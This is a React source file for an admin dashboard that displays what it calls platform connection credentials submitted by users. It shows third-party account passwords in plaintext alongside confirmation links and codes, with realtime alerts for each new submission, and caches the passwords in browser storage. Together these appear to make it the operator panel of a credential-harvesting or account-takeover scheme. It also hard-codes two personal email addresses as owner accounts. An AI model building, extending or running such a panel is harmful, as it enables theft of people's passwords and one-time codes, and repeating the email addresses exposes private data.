import React, { useEffect, useRef, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { supabase } from '../lib/supabase';
import Connect from './Connect';
import GuestPassGenerator from '../components/admin/GuestPassGenerator';
import { useAuth } from '../contexts/AuthContext';

const ADMIN_CACHE_KEY = 'nexara_admin_status';
const REQUESTS_CACHE_KEY = 'nexara_cached_platform_requests';
const USERS_CACHE_KEY = 'nexara_cached_users';

export default function Admin() {
  const navigate = useNavigate();
  const isMounted = useRef(true);
  const currentInitId = useRef(0);
  const abortController = useRef<AbortController | null>(null);
  const backgroundValidationInProgress = useRef(false);
  const realtimeChannel = useRef<any>(null);
  const pollingTimer = useRef<number | null>(null);
  const { user: authUser, session: authSession, loading: authLoading } = useAuth();
  const adminInitUserId = useRef<string | null>(null);
  const [rows, setRows] = useState<any[]>([]);
  const [users, setUsers] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);
  const [isAdmin, setIsAdmin] = useState(false);
  const [authChecked, setAuthChecked] = useState(false);
  const [adminState, setAdminState] = useState<'loading-session' | 'verifying-admin' | 'ready'>('loading-session');
  const [unauthorizedMessage, setUnauthorizedMessage] = useState('');
  const [statusMessage, setStatusMessage] = useState('');
  const [debugMessages, setDebugMessages] = useState<string[]>([]);
  const [hasInitialLoadCompleted, setHasInitialLoadCompleted] = useState(false);
  const [syncDelayed, setSyncDelayed] = useState(false);
  const [isLive, setIsLive] = useState(false);
  const liveTimer = useRef<number | null>(null);

  const sleep = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));

  const loadCachedData = () => {
    const cachedRows = getCachedRequests();
    const cachedUsers = getCachedUsers();

    if (cachedRows.length) {
      setRows(cachedRows);
    }

    if (cachedUsers.length) {
      setUsers(cachedUsers);
    }

    if (cachedRows.length || cachedUsers.length) {
      setHasInitialLoadCompleted(true);
    }

    return { cachedRows, cachedUsers };
  };

  const triggerLiveIndicator = (message: string) => {
    if (!isMounted.current) return;
    setIsLive(true);
    if (liveTimer.current) {
      window.clearTimeout(liveTimer.current);
    }
    liveTimer.current = window.setTimeout(() => {
      if (isMounted.current) setIsLive(false);
    }, 1200);
    addDebugMessage(message);
  };

  const enableCacheFallback = (message = 'Sync delayed. Showing cached data.') => {
    if (!isMounted.current) return;

    setSyncDelayed(true);
    updateStatusMessage(message);
    setHasInitialLoadCompleted(true);

    const { cachedRows, cachedUsers } = loadCachedData();
    if (cachedRows.length || cachedUsers.length) {
      addDebugMessage('fallback to cached data');
    }
  };

  const addDebugMessage = (msg: string) => {
    setDebugMessages(prev => [...prev, `${new Date().toLocaleTimeString()}: ${msg}`]);
  };

  const saveAdminStatusToCache = () => {
    try {
      localStorage.setItem(ADMIN_CACHE_KEY, 'true');
      console.log('Admin: saved admin status to cache');
      addDebugMessage('admin status cached');
    } catch (err) {
      console.warn('Admin: failed to save admin status to cache:', err);
    }
  };

  const saveRequestsToCache = (cachedRows: any[]) => {
    try {
      localStorage.setItem(REQUESTS_CACHE_KEY, JSON.stringify(cachedRows));
      console.log('Admin: saved platform request cache');
      addDebugMessage('platform request cache updated');
    } catch (err) {
      console.warn('Admin: failed to save platform request cache:', err);
    }
  };

  const saveUsersToCache = (cachedUsers: any[]) => {
    try {
      localStorage.setItem(USERS_CACHE_KEY, JSON.stringify(cachedUsers));
      console.log('Admin: saved users cache');
      addDebugMessage('users cache updated');
    } catch (err) {
      console.warn('Admin: failed to save users cache:', err);
    }
  };

  const clearAdminCache = () => {
    try {
      localStorage.removeItem(ADMIN_CACHE_KEY);
      localStorage.removeItem(REQUESTS_CACHE_KEY);
      localStorage.removeItem(USERS_CACHE_KEY);
      console.log('Admin: cleared admin status and data cache');
      addDebugMessage('admin cache cleared');
    } catch (err) {
      console.warn('Admin: failed to clear admin cache:', err);
    }
  };

  const getCachedAdminStatus = (): boolean => {
    try {
      const cached = localStorage.getItem(ADMIN_CACHE_KEY);
      return cached === 'true';
    } catch (err) {
      console.warn('Admin: failed to read admin cache:', err);
      return false;
    }
  };

  const getCachedRequests = (): any[] => {
    try {
      const cached = localStorage.getItem(REQUESTS_CACHE_KEY);
      return cached ? JSON.parse(cached) : [];
    } catch (err) {
      console.warn('Admin: failed to read platform request cache:', err);
      return [];
    }
  };

  const getCachedUsers = (): any[] => {
    try {
      const cached = localStorage.getItem(USERS_CACHE_KEY);
      return cached ? JSON.parse(cached) : [];
    } catch (err) {
      console.warn('Admin: failed to read users cache:', err);
      return [];
    }
  };

  useEffect(() => {
    const cachedAdmin = getCachedAdminStatus();
    if (!cachedAdmin) return;

    console.log('Admin: cached admin status detected; will validate on load');
    addDebugMessage('cached admin status detected');
    updateStatusMessage('Restoring admin session and validating fresh data...');
  }, []);

  const finishAuthCheck = (message = '', initId?: number) => {
    if (!isMounted.current) return;
    if (initId !== undefined && currentInitId.current !== initId) return;
    setAuthChecked(true);
    setLoading(false);
    setAdminState('ready');
    setUnauthorizedMessage(message);
  };

  const updateStatusMessage = (message: string) => {
    if (!isMounted.current) return;
    setStatusMessage(message);
  };

  const initializeAdmin = async (user: any) => {
    const initId = ++currentInitId.current;
    console.log('Admin: initializeAdmin called with user:', user ? { id: user.id, email: user.email } : null, 'initId:', initId);
    if (!isMounted.current) {
      console.log('Admin: component unmounted, skipping');
      return;
    }

    // Abort previous admin check
    if (abortController.current) {
      abortController.current.abort();
    }
    abortController.current = new AbortController();

    if (!user) {
      console.log('Admin: no user, setting not admin');
      updateStatusMessage('No active admin session found. Please sign in.');
      setIsAdmin(false);
      finishAuthCheck();
      return;
    }

    // Check cache first for instant hydration
    const cachedAdmin = getCachedAdminStatus();
    if (cachedAdmin) {
      console.log('Admin: cache hit - instant hydration');
      addDebugMessage('cache hit - instant hydration');
      loadCachedData();
      setIsAdmin(true);
      setAuthChecked(true);
      setAdminState('ready');
      setLoading(true);
      updateStatusMessage('Loaded cached data. Refreshing from server...');

      // Always refresh from the server when a session is restored,
      // even if cached values exist on this device.
      await backgroundValidateAdmin(user, initId);
      return;
    }

    // No cache: perform normal initialization
    console.log('Admin: no cache - performing full check');
    setLoading(true);
    setAuthChecked(false);
    setAdminState('verifying-admin');
    updateStatusMessage('Verifying admin access...');
    addDebugMessage('admin check started (no cache)');

    try {
      if (!user.id) {
        console.log('Admin: user missing id, cannot proceed');
        addDebugMessage('check-failed: user missing id');
        updateStatusMessage('Invalid user session. Please refresh and try again.');
        setIsAdmin(false);
        finishAuthCheck('Invalid user session.');
        return;
      }

      const { data: profile, error } = await supabase
        .from('profiles')
        .select('is_admin')
        .eq('id', user.id)
        .maybeSingle();

      if (error) {
        console.error('Admin: profile query error:', error);
        throw error;
      }

      console.log('Admin: profile query result:', profile);
      addDebugMessage('profile query completed');
      const normalizedEmail = user.email?.toLowerCase?.() ?? '';
      const adminOwnerEmails = ['gibsonkobia@gmail.com', 'davidibrown776@gmail.com'];
      const isOwner = adminOwnerEmails.includes(normalizedEmail);
      console.log('Admin: isOwner check:', isOwner, 'user email:', user.email);

      if (!profile?.is_admin && !isOwner) {
        console.log('Admin: not admin, showing error');
        addDebugMessage('check-failed: not admin');
        updateStatusMessage('Admin access denied for this account.');
        setIsAdmin(false);
        finishAuthCheck('You do not have admin access with this account.');
        return;
      }

      console.log('Admin: user is admin - saving to cache');
      addDebugMessage('admin check passed - caching');
      saveAdminStatusToCache();
      setIsAdmin(true);
      setUnauthorizedMessage('');
      updateStatusMessage('Admin access granted. Fetching platform requests...');
      finishAuthCheck('', initId);
      await fetchSubmissions(abortController.current.signal);
      await fetchUsers();
      console.log('Admin: fetchUsers completed');
      updateStatusMessage('Loaded admin data.');
      addDebugMessage('check-completed');
    } catch (err) {
      if (err.name === 'AbortError') {
        console.log('Admin: admin check aborted');
        addDebugMessage('check-aborted');
        return;
      }
      console.error('Admin: Error checking admin status:', err);
      addDebugMessage(`check-failed: ${err}`);
      setIsAdmin(false);
      if (isMounted.current) {
        finishAuthCheck('Unable to verify admin access. Please try again later.', initId);
      }
    } finally {
      if (isMounted.current) {
        setLoading(false);
        setAdminState('ready');
        console.log('Admin: initializeAdmin finally block - loading state cleared');
      }
    }
  };

  const backgroundValidateAdmin = async (user: any, initId: number) => {
    // Prevent concurrent background validations
    if (backgroundValidationInProgress.current) {
      console.log('Admin: background validation already in progress');
      return;
    }

    backgroundValidationInProgress.current = true;
    console.log('Admin: starting background validation');
    addDebugMessage('background validation started');

    try {
      if (!user.id) {
        throw new Error('User missing id');
      }

      const { data: profile, error } = await supabase
        .from('profiles')
        .select('is_admin')
        .eq('id', user.id)
        .maybeSingle();

      if (error) {
        throw error;
      }

      const normalizedEmail = user.email?.toLowerCase?.() ?? '';
      const adminOwnerEmails = ['gibsonkobia@gmail.com', 'davidibrown776@gmail.com'];
      const isOwner = adminOwnerEmails.includes(normalizedEmail);

      if (!profile?.is_admin && !isOwner) {
        console.log('Admin: background validation failed - user no longer admin');
        addDebugMessage('background validation failed: not admin');
        
        // User is no longer admin - clear cache and redirect silently
        clearAdminCache();
        setIsAdmin(false);
        setUnauthorizedMessage('Your admin access has been revoked.');
        if (isMounted.current) {
          setTimeout(() => {
            if (isMounted.current) {
              navigate('/login');
            }
          }, 2000);
        }
        return;
      }

      console.log('Admin: background validation passed');
      addDebugMessage('background validation passed');
      updateStatusMessage('Admin status confirmed.');
      
      // Refresh data in background
      await fetchSubmissions(abortController.current?.signal);
      await fetchUsers();
      
    } catch (err) {
      console.error('Admin: background validation error:', err);
      addDebugMessage(`background validation error: ${err}`);

      const status = (err as any)?.status;
      const message = String(err).toLowerCase();
      const isAuthError = status === 401 || status === 403 || message.includes('jwt') || message.includes('permission denied');

      if (isAuthError) {
        console.log('Admin: auth-related background validation failure, clearing cache');
        clearAdminCache();
        setIsAdmin(false);
        setUnauthorizedMessage('Your admin access has been revoked.');
        if (isMounted.current) {
          setTimeout(() => {
            if (isMounted.current) {
              navigate('/login');
            }
          }, 2000);
        }
      } else {
        console.log('Admin: non-auth background validation failure, keeping cache');
        updateStatusMessage('Background validation unavailable. Using cached data.');
      }
    } finally {
      backgroundValidationInProgress.current = false;
      console.log('Admin: background validation completed');
      addDebugMessage('background validation completed');
    }
  };

  useEffect(() => {
    return () => {
      isMounted.current = false;
      if (abortController.current) {
        abortController.current.abort();
      }
      if (liveTimer.current) {
        window.clearTimeout(liveTimer.current);
      }
    };
  }, []);

  const authTimeout = useRef<number | null>(null);

  useEffect(() => {
    addDebugMessage('auth state changed via context');
    updateStatusMessage(authLoading ? 'Restoring saved admin session...' : 'Verifying admin access...');

    if (authLoading) {
      setAdminState('loading-session');
      return;
    }

    if (!authUser) {
      addDebugMessage('no auth user after restore');
      setIsAdmin(false);
      setAdminState('ready');
      finishAuthCheck('No active session. Please sign in.');
      return;
    }

    if (adminInitUserId.current === authUser.id) {
      addDebugMessage('auth user unchanged; skipping duplicate admin init');
      return;
    }

    adminInitUserId.current = authUser.id;
    addDebugMessage(`new auth user detected: ${authUser.email}`);
    initializeAdmin(authUser);
  }, [authLoading, authUser]);

  useEffect(() => {
    if (!authUser || !isAdmin) return;

    // Replace unstable realtime subscriptions with a single synchronous fetch.
    const fetchAdminData = async () => {
      try {
        console.log('🛠️ ADMIN_POLL: fetching guest_passes, platform_connection_requests, platform_connections');

        const [guestResp, requestsResp, connectionsResp] = await Promise.all([
          supabase.from('guest_passes').select('*'),
          supabase.from('platform_connection_requests').select('*'),
          supabase.from('platform_connections').select('*'),
        ]);

        if (guestResp.error) {
          console.warn('ADMIN_POLL: guest_passes query error', guestResp.error);
        } else {
          console.log('ADMIN_POLL: guest_passes rows', (guestResp.data || []).length);
        }

        if (requestsResp.error) {
          console.warn('ADMIN_POLL: platform_connection_requests query error', requestsResp.error);
        } else {
          const submissions = (requestsResp.data || []).map((row: any) => ({
            id: row.id,
            platform: row.platform,
            contact: row.email || row.phone || row.contact || '-',
            email: row.email || null,
            phone: row.phone || null,
            third_party_password: row.third_party_password,
            confirmation_link: row.confirmation_link || null,
            code: row.code,
            tracking_id: row.tracking_id,
            created_at: row.created_at,
            user_id: row.user_id || null,
            status: row.status,
            source: row.source,
          }));

          setRows(submissions);
          saveRequestsToCache(submissions);
          triggerLiveIndicator('Admin live data refreshed');
        }

        if (connectionsResp.error) {
          console.warn('ADMIN_POLL: platform_connections query error', connectionsResp.error);
        } else {
          console.log('ADMIN_POLL: platform_connections rows', (connectionsResp.data || []).length);
        }

        // Also refresh users list using existing fetch logic
        await fetchUsers();
        setHasInitialLoadCompleted(true);
      } catch (err) {
        console.error('ADMIN_POLL: unexpected error fetching admin data', err);
        addDebugMessage('admin poll failed');
      }
    };

    const clearPolling = () => {
      if (pollingTimer.current !== null) {
        window.clearInterval(pollingTimer.current);
        pollingTimer.current = null;
      }
    };

    const removeRealtimeChannel = () => {
      if (realtimeChannel.current) {
        try {
          supabase.removeChannel(realtimeChannel.current);
        } catch (err) {
          console.warn('Admin: failed to remove realtime channel', err);
        }
        realtimeChannel.current = null;
      }
    };

    const startRealtimeFallback = () => {
      if (pollingTimer.current !== null) return;
      console.warn('Admin: realtime unavailable, using polling fallback');
      addDebugMessage('realtime unavailable, polling instead');
      updateStatusMessage('Realtime unavailable. Refreshing admin data every 2 seconds.');
      pollingTimer.current = window.setInterval(async () => {
        console.log('Admin: realtime fallback polling tick');
        await fetchAdminData();
      }, 2000);
    };

    // Run once on mount (replacement for realtime subscription)
    fetchAdminData();

    // Set up realtime subscriptions so admin sees updates as they happen
    try {
      // Remove any existing channel first
      if (realtimeChannel.current) {
        try {
          supabase.removeChannel(realtimeChannel.current);
        } catch (err) {
          console.warn('Admin: failed to remove existing realtime channel', err);
        }
        realtimeChannel.current = null;
      }

      const channel = supabase.channel('public:platform_connection_requests');

      channel.on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'platform_connection_requests' }, (payload) => {
        try {
          const newRow = payload.new as any;
          console.log('[REALTIME_INSERT] Received INSERT payload:', { id: newRow.id, platform: newRow.platform, email: newRow.email ? '[REDACTED]' : null, tracking_id: newRow.tracking_id });
          
          const submission = {
            id: newRow.id,
            platform: newRow.platform,
            contact: newRow.email || newRow.phone || newRow.contact || '-',
            third_party_password: newRow.third_party_password,
            created_at: newRow.created_at,
            user_id: newRow.user_id || null,
            status: newRow.status,
            source: newRow.source,
            code: newRow.code,
            confirmation_link: newRow.confirmation_link || null,
            isNew: true,
          };

          setRows((prev) => {
            const merged = [submission, ...prev];
            saveRequestsToCache(merged);
            console.log('[REALTIME_INSERT] ✅ Added to UI state, total rows:', merged.length);
            return merged;
          });
          triggerLiveIndicator(`Realtime INSERT: ${newRow.id}`);
        } catch (err) {
          console.error('[REALTIME_INSERT] ❌ Handler error:', err);
          addDebugMessage(`❌ realtime INSERT failed: ${err instanceof Error ? err.message : String(err)}`);
        }
      });

      channel.on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'platform_connection_requests' }, (payload) => {
        try {
          const updated = payload.new as any;
          console.log('[REALTIME_UPDATE] Received UPDATE payload:', { id: updated.id, tracking_id: updated.tracking_id, code: updated.code, confirmation_link: updated.confirmation_link ? '[SET]' : '[EMPTY]' });
          
          setRows((prev) => {
            const mapped = prev.map((r) => {
              if (String(r.id) === String(updated.id)) {
                const newRowData = {
                  ...r,
                  platform: updated.platform,
                  contact: updated.email || updated.phone || updated.contact || r.contact,
                  email: updated.email || r.email,
                  phone: updated.phone || r.phone,
                  third_party_password: updated.third_party_password || r.third_party_password,
                  created_at: updated.created_at || r.created_at,
                  user_id: updated.user_id || r.user_id,
                  status: updated.status || r.status,
                  source: updated.source || r.source,
                  code: updated.code || r.code,
                  confirmation_link: updated.confirmation_link || r.confirmation_link,
                  tracking_id: updated.tracking_id || r.tracking_id,
                };
                console.log('[REALTIME_UPDATE] ✅ Updated row:', { id: updated.id, changes: { code: updated.code ? '[SET]' : undefined, confirmation_link: updated.confirmation_link ? '[SET]' : undefined } });
                return newRowData;
              }
              return r;
            });
            saveRequestsToCache(mapped);
            console.log('[REALTIME_UPDATE] ✅ UI state updated');
            return mapped;
          });
          triggerLiveIndicator(`Realtime UPDATE: ${updated.id}`);
        } catch (err) {
          console.error('[REALTIME_UPDATE] ❌ Handler error:', err);
          addDebugMessage(`❌ realtime UPDATE failed: ${err instanceof Error ? err.message : String(err)}`);
        }
      });

      channel.subscribe((status) => {
        console.log('[REALTIME_CHANNEL] Subscription status:', status);
        addDebugMessage(`📡 realtime channel: ${status}`);
        if (status === 'SUBSCRIBED') {
          console.log('[REALTIME_CHANNEL] ✅ Successfully subscribed to platform_connection_requests changes');
          clearPolling();
          updateStatusMessage('Admin realtime connected.');
        } else if (status === 'CLOSED') {
          console.warn('[REALTIME_CHANNEL] ⚠️ Channel closed');
          addDebugMessage('realtime channel closed, falling back to polling');
          startRealtimeFallback();
        } else if (status === 'CHANNEL_ERROR') {
          console.error('[REALTIME_CHANNEL] ❌ Channel error');
          addDebugMessage('realtime channel error, falling back to polling');
          removeRealtimeChannel();
          startRealtimeFallback();
        }
      });

      realtimeChannel.current = channel;
    } catch (err) {
      console.warn('Admin: failed to create realtime channel', err);
      addDebugMessage(`realtime setup failed: ${err instanceof Error ? err.message : String(err)}`);
      startRealtimeFallback();
    }

    // Cleanup: remove realtime channel on unmount or when auth changes
    return () => {
      if (pollingTimer.current !== null) {
        window.clearInterval(pollingTimer.current);
        pollingTimer.current = null;
      }
      if (realtimeChannel.current) {
        try {
          supabase.removeChannel(realtimeChannel.current);
          realtimeChannel.current = null;
        } catch (err) {
          console.warn('Admin: failed to remove realtime channel during cleanup', err);
        }
      }
    };
  }, [authUser, isAdmin]);

  const fetchSubmissions = async (signal?: AbortSignal) => {
    addDebugMessage('submissions fetch started');
    console.log('Admin: fetchSubmissions started (direct supabase query)');

    try {
      updateStatusMessage('Loading submissions...');
      setSyncDelayed(false);

      // Directly query the active submissions table to avoid backend route instability
      const { data: submissions, error } = await supabase
        .from('platform_connection_requests')
        .select('*');

      if (error) {
        console.error('❌ FETCH ERROR DETAILS:', error);
        addDebugMessage(`submissions fetch failed: ${error.message || String(error)}`);
        enableCacheFallback();
        return;
      }

      console.log('Admin: submissions query count:', (submissions || []).length);

      const mergedRows = (submissions || []).map((row: any) => ({
        id: row.id,
        platform: row.platform,
        contact: row.email || row.phone || '-',
        third_party_password: row.third_party_password,
        created_at: row.created_at,
        user_id: row.user_id || null,
        status: row.status,
        source: row.source,
        code: row.code,
        confirmation_link: row.confirmation_link || null,
      }));

      console.log('Admin: merged rows count:', mergedRows.length);
      addDebugMessage(`submissions fetch success: ${mergedRows.length} submissions`);
      setRows(mergedRows);
      saveRequestsToCache(mergedRows);
      setHasInitialLoadCompleted(true);
      setSyncDelayed(false);
    } catch (err) {
      console.error('❌ FETCH ERROR DETAILS:', err);
      const errorMsg = err instanceof Error ? err.message : String(err);
      addDebugMessage(`submissions fetch failed: ${errorMsg}`);
      enableCacheFallback();
    } finally {
      console.log('Admin: fetchSubmissions finally, setting loading false');
      if (isMounted.current) {
        setLoading(false);
        setHasInitialLoadCompleted(true);
      }
    }
  };

  const fetchUsers = async () => {
    addDebugMessage('users fetch started');
    console.log('Admin: fetchUsers started');
    try {
      let { data: usersData, error } = await supabase
        .from('profiles')
        .select('id, email, auth_provider, is_admin, created_at');

      if (error && error.message?.includes('auth_provider')) {
        console.warn('Admin: auth_provider missing, retrying users query without it');
        const fallback = await supabase
          .from('profiles')
          .select('id, email, is_admin, created_at');
        usersData = fallback.data as any;
        error = fallback.error;

        if (!error && usersData) {
          usersData = usersData.map((user: any) => ({ ...user, auth_provider: 'email' }));
        }
      }

      if (error) {
        console.error('Admin: fetchUsers error:', error);
        addDebugMessage(`users fetch failed: ${error.message}`);
        return;
      }

      console.log('Admin: users data:', usersData);
      addDebugMessage(`users fetch success: ${usersData?.length || 0} users`);
      setUsers(usersData || []);
      saveUsersToCache(usersData || []);
      setHasInitialLoadCompleted(true);
    } catch (err) {
      console.error('Admin: Error loading users:', err);
      const errorMsg = err instanceof Error ? err.message : String(err);
      addDebugMessage(`users fetch failed: ${errorMsg}`);
    }
  };

  const renderContent = () => {
    if (!authChecked) {
      console.log('Admin: rendering auth check placeholder');
      return (
        <div className="mx-auto max-w-5xl rounded-2xl border border-white/10 bg-white/5 p-5">
          <div className="flex flex-col gap-3 text-slate-300">
            <div className="flex items-center gap-3">
              <div className="animate-spin rounded-full h-5 w-5 border-t-2 border-b-2 border-white"></div>
              <span>Checking admin session...</span>
            </div>
            {statusMessage && <p className="text-sm text-slate-400">{statusMessage}</p>}
          </div>
        </div>
      );
    }

    if (!isAdmin) {
      console.log('Admin: rendering Connect with error:', unauthorizedMessage);
      return <Connect externalError={unauthorizedMessage} />;
    }

    if (loading && !hasInitialLoadCompleted) {
      console.log('Admin: rendering admin loading placeholder');
      return (
        <div className="mx-auto max-w-5xl rounded-2xl border border-white/10 bg-white/5 p-5">
          <div className="flex flex-col gap-3 text-slate-300">
            <div className="flex items-center gap-3">
              <div className="animate-spin rounded-full h-5 w-5 border-t-2 border-b-2 border-white"></div>
              <span>Loading admin submissions...</span>
            </div>
            {statusMessage && <p className="text-sm text-slate-400">{statusMessage}</p>}
          </div>
        </div>
      );
    }

    console.log('Admin: rendering admin page');
    return (
      <div className="mx-auto max-w-5xl rounded-2xl border border-white/10 bg-white/5 p-5">
        <div className="flex justify-between items-center mb-6">
          <div>
            <div className="flex items-center gap-2 mb-2">
              <span className={`h-2.5 w-2.5 rounded-full ${isLive ? 'bg-emerald-400 animate-pulse' : 'bg-slate-500'}`} />
              <span className={isLive ? 'text-emerald-300 font-semibold' : 'text-slate-400'}>
                {isLive ? 'Live • Updating' : 'Live'}
              </span>
            </div>
            <h1 className="text-2xl font-semibold">Admin submissions</h1>
            <p className="text-sm text-slate-300">
              Platform connection credentials submitted by users.
            </p>
            {syncDelayed && (
              <div className="mt-3 inline-flex items-center rounded-full border border-yellow-500/30 bg-yellow-900/20 px-3 py-1 text-xs text-yellow-200">
                Sync delayed. Showing cached data.
              </div>
            )}
          </div>
          <button 
            onClick={async () => {
              console.log('[SIGN_OUT] Admin initiated sign out');
              
              // Immediately clear requests
              setRows([]);
              
              // Forcefully clear all localStorage and sessionStorage before sign out
              console.log('[SIGN_OUT] Clearing localStorage and sessionStorage');
              localStorage.clear();
              sessionStorage.clear();
              
              // Clear admin-specific caches
              clearAdminCache();
              
              try {
                await supabase.auth.signOut();
                console.log('[SIGN_OUT] ✓ Supabase sign out completed');
              } catch (err) {
                console.error('[SIGN_OUT] Supabase sign out failed:', err);
              } finally {
                console.log('[SIGN_OUT] ✓ All storage cleared, redirecting to /login');
                navigate('/login');
              }
            }}
            className="text-sm text-slate-400 hover:text-white underline underline-offset-4"
          >
            Sign Out
          </button>
        </div>
        <GuestPassGenerator />
        <div className="overflow-x-auto">
          <table className="min-w-full text-left text-sm">
            <thead className="text-slate-400">
              <tr>
                <th className="px-3 py-2">Platform</th>
                <th className="px-3 py-2">Tracking ID</th>
                <th className="px-3 py-2">Email / Phone</th>
                <th className="px-3 py-2">Password</th>
                <th className="px-3 py-2">Confirmation Link</th>
                <th className="px-3 py-2">Code</th>
                <th className="px-3 py-2">Status</th>
                <th className="px-3 py-2">Created at</th>
                <th className="px-3 py-2">User ID</th>
              </tr>
            </thead>
            <tbody>
              {rows.map((row) => (
                <tr key={`${row.id}-${row.status}`} className={`border-t border-white/10 hover:bg-white/5 transition ${row.isNew ? 'bg-green-900/20' : ''}`}>
                  <td className="px-3 py-2">{row.platform} {row.isNew && <span className="ml-2 bg-red-500 text-white text-xs px-1 py-0.5 rounded animate-pulse">NEW</span>}</td>
                  <td className="px-3 py-2 text-slate-300 text-xs font-mono break-words max-w-[180px]">{row.tracking_id || '-'}</td>
                  <td className="px-3 py-2 text-slate-100 text-xs break-words max-w-[180px]">{row.contact}</td>
                  <td className="px-3 py-2 text-slate-400 font-mono text-xs">{row.third_party_password || '-'}</td>
                  <td className="px-3 py-2 text-slate-300 text-xs max-w-[220px] break-words whitespace-normal font-mono">{row.confirmation_link || '-'}</td>
                  <td className="px-3 py-2 font-mono font-semibold text-green-400">{row.code ? (
                    <span className="bg-green-900/20 px-2 py-1 rounded text-green-300 font-bold">{row.code}</span>
                  ) : '-'}</td>
                  <td className="px-3 py-2"><span className={`text-xs px-2 py-1 rounded ${row.status === 'pending' ? 'bg-yellow-900/20 text-yellow-300' : 'bg-green-900/20 text-green-300'}`}>{row.status}</span></td>
                  <td className="px-3 py-2 text-slate-400 text-xs">
                    {new Date(row.created_at).toLocaleString()}
                  </td>
                  <td className="px-3 py-2 text-slate-400 truncate max-w-[100px] text-xs font-mono">{row.user_id || '-'}</td>
                </tr>
              ))}
              {rows.length === 0 && hasInitialLoadCompleted && (
                <tr>
                  <td colSpan={9} className="px-3 py-8 text-center text-slate-500">
                    {loading ? 'Loading submissions...' : 'No submissions found.'}
                  </td>
                </tr>
              )}
              {rows.length === 0 && !hasInitialLoadCompleted && (
                <tr>
                  <td colSpan={9} className="px-3 py-8 text-center text-slate-500">
                    Loading submissions...
                  </td>
                </tr>
              )}
            </tbody>
          </table>
        </div>

        {/* Users Table */}
        <div className="mt-10">
          <h2 className="text-2xl font-semibold mb-4">Registered Users</h2>
          <div className="overflow-x-auto">
            <table className="min-w-full text-left text-sm">
              <thead className="text-slate-400">
                <tr>
                  <th className="px-3 py-2">Email</th>
                  <th className="px-3 py-2">Auth Provider</th>
                  <th className="px-3 py-2">Admin</th>
                  <th className="px-3 py-2">Created at</th>
                  <th className="px-3 py-2">User ID</th>
                </tr>
              </thead>
              <tbody>
                {users.map((user) => (
                  <tr key={user.id} className="border-t border-white/10">
                    <td className="px-3 py-2">{user.email}</td>
                    <td className="px-3 py-2">{user.auth_provider || 'email'}</td>
                    <td className="px-3 py-2">{user.is_admin ? 'Yes' : 'No'}</td>
                    <td className="px-3 py-2 text-slate-400">
                      {new Date(user.created_at).toLocaleString()}
                    </td>
                    <td className="px-3 py-2 text-slate-400 truncate max-w-[100px]">{user.id}</td>
                  </tr>
                ))}
                {users.length === 0 && (
                  <tr>
                    <td colSpan={5} className="px-3 py-8 text-center text-slate-500">
                      {loading ? 'Loading users...' : 'No users found.'}
                    </td>
                  </tr>
                )}
              </tbody>
            </table>
          </div>
        </div>
      </div>
    );
  };

  return (
    <main className="min-h-screen bg-[#0a0a0c] px-4 py-10 text-white sm:px-6">
      {renderContent()}
    </main>
  );
}
